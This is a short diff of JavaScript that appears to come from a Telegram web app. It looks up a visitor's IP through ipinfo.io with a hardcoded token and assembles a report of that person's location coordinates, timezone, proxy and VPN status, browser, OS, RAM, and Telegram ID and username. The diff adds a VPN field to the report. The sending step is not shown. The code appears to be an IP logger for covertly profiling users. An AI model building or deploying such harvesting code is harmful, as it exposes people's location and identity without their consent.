@@ -117,11 +117,6 @@ fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
             isProxy = data.proxy ? "Yes" : "No";
         }
 
-        // Используйте значения isProxy и isVPN по вашему усмотрению
-        console.log('Is Proxy: ', isProxy);
-        console.log('Is VPN: ', isVPN);
-    });
-
       
         const message = `
       * Ip 🌐*
@@ -133,6 +128,7 @@ fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
     *├ Timezone IP: ${time}*
     *├ Coordinates: ${longitude} ${latitude},*
     *├ Proxy: ${isProxy},*
+    *├ Vpn: ${isVPN},*
       * System 🖥*
     *├ Browser: ${browser}*
     *├ Os: ${osname}*
@@ -143,7 +139,6 @@ fetch('https://ipinfo.io/' + ip + '/json?token=afae6637fcf7bf')
     *├ Timezone: ${timeZone}*
     *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
     *├ Memory: ${memory} RAM*
-    *├ Internet: ${TypeInternet}*
       *🔍  Account: *
     *├ ID: ${tg.initDataUnsafe.user.id}*
     *├ Username: @${tg.initDataUnsafe.user.username}*
